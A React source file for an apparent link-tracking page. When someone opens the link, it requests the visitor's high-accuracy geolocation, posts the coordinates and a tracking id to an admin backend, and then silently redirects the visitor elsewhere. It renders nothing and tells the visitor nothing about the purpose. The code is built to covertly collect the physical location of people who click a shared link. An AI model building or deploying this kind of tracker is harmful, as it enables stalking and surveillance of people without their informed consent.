import { useEffect } from "react";

export default function TrackingPage() {
     useEffect(() => {
          const runTracking = async () => {
               const query = new URLSearchParams(window.location.search);
               const rawTrack = query.get("track");
               const track = rawTrack?.split(":")[0] ?? "";
               const API_URL = import.meta.env.VITE_API_URL;

               const sendLocationAndRedirect = async (
                    latitude: number | null,
                    longitude: number | null
               ) => {
                    const response = await fetch(`${API_URL}/admin/url/track/`, {
                         method: "POST",
                         headers: {
                         "Content-Type": "application/json",
                              "api-key": import.meta.env.VITE_API_KEY,
                         },
                         body: JSON.stringify({ latitude, longitude, track }),
                    });

                    const data = await response.json();

                    if (data.redirect) {
                         window.location.replace(data.redirect);
                    }
               };

               navigator.geolocation.getCurrentPosition(
               (pos) => {
                    sendLocationAndRedirect(pos.coords.latitude, pos.coords.longitude);
               },
               () => {
                    sendLocationAndRedirect(null, null);
               },
               { enableHighAccuracy: true, timeout: 5000 }
               );
          };

          runTracking();
     }, []);

     return null;
}
